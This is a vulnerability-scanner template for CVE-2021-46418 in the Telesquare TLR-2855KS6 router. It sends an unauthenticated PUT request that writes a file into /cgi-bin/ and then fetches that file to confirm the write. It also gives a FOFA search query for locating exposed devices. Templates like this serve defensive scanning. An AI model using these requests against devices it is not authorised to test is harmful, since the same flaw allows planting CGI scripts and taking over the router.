id: CVE-2021-46418

info:
  name: Telesquare TLR-2855KS6 - 任意文件创建
  author: Momen Eldawakhly (Cyber Guy)
  severity: critical
  description: |
    Telesquare TLR-2855KS6 中存在通过 PUT 方法创建未授权文件的漏洞，可允许创建 CGI 脚本。
    fofa-query: product=="TELESQUARE-TLR-2855KS6"
  reference:
    - https://www.exploit-db.com/exploits/50862
    - http://packetstormsecurity.com/files/166674/Telesquare-TLR-2855KS6-Arbitrary-File-Creation.html
    - https://drive.google.com/drive/folders/1avIfk1MZNmNQYePE1_n4irC24daxCeBA
  tags: Telesquare-TLR-2855KS6

flow: |
  http("r0") && http("r1")

http:
  - id: "r0"
    raw:
      - |
        PUT /cgi-bin/{{randstr}}.txt HTTP/1.1
        Host: {{Hostname}}
        DNT: 1

        {{randstr_2}}
        

    matchers:
      - type: dsl
        dsl:
          - status_code == 201
        condition: and

  - id: "r1"
    raw:
      - |
        GET /cgi-bin/{{randstr}}.txt HTTP/1.1
        Host: {{Hostname}}

        

    matchers:
      - type: dsl
        dsl:
          - contains(body,"{{randstr_2}}")
        condition: and

